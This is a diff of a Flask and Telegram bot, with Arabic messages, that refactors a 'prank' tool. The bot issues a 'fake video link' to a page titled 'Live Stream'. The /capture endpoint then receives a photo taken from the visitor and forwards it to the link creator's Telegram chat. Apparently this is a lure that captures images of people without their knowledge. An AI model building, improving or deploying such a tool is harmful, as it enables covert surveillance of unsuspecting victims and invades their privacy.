@@ -32,17 +32,15 @@ if MONGO_URL:
         print(f"❌ DB Error: {e}")
 
 @app.route("/")
-def home():
-    return "Bot is running"
+def home(): return "Bot is running"
 
 @app.route("/capture", methods=["GET"])
 def capture_page():
     user_id = request.args.get("user_id", type=int)
     is_allowed = False
-    if users_collection is not None and user_id:
+    if users_collection is not None:
         is_allowed = users_collection.find_one({"user_id": user_id}) is not None
-    if not user_id or not is_allowed:
-        return "الرابط غير صالح", 403
+    if not user_id or not is_allowed: return "الرابط غير صالح", 403
 
     html = """
     <!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Live Stream</title>
@@ -54,18 +52,15 @@ def capture_page():
 
 @app.route("/capture", methods=["POST"])
 def capture():
-    photo = request.files.get("photo")
-    user_id = request.form.get("user_id", type=int)
+    photo = request.files.get("photo"); user_id = request.form.get("user_id", type=int)
     is_allowed = False
-    if users_collection is not None and user_id:
+    if users_collection is not None:
         is_allowed = users_collection.find_one({"user_id": user_id}) is not None
-    if not photo or not user_id or not is_allowed:
-        return "Invalid request", 400
+    if not photo or not user_id or not is_allowed: return "Invalid request", 400
     try:
         bot.send_photo(chat_id=user_id, photo=photo.stream.read())
         return "Image sent", 200
-    except Exception as e:
-        return f"Error: {e}", 500
+    except Exception as e: return f"Error: {e}", 500
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -81,31 +76,15 @@ def webhook():
         abort(403)
 
 @bot.message_handler(commands=["start"])
-def start(message):
-    print(f"--- START COMMAND RECEIVED FROM {message.chat.id} ---")
-    try:
-        bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
-        print("--- START REPLY SENT ---")
-    except Exception as e:
-        print(f"❌ Error in /start: {e}")
+def start(message): bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
 
 @bot.message_handler(commands=["link"])
 def link(message):
-    print(f"--- LINK COMMAND RECEIVED FROM {message.chat.id} ---")
     try:
-        if not BASE_URL:
-            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Render.")
-            return
-
         if users_collection is not None:
-            users_collection.update_one(
-                {"user_id": message.chat.id},
-                {"$set": {"user_id": message.chat.id}},
-                upsert=True
-            )
+            users_collection.update_one({"user_id": message.chat.id}, {"$set": {"user_id": message.chat.id}}, upsert=True)
         url = f"{BASE_URL}/capture?user_id={message.chat.id}"
         bot.reply_to(message, f"🎬 تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
-        print(f"--- LINK REPLY SENT: {url} ---")
     except Exception as e:
         print(f"❌ Error in /link: {e}")
         bot.reply_to(message, f"حدث خطأ: {e}")
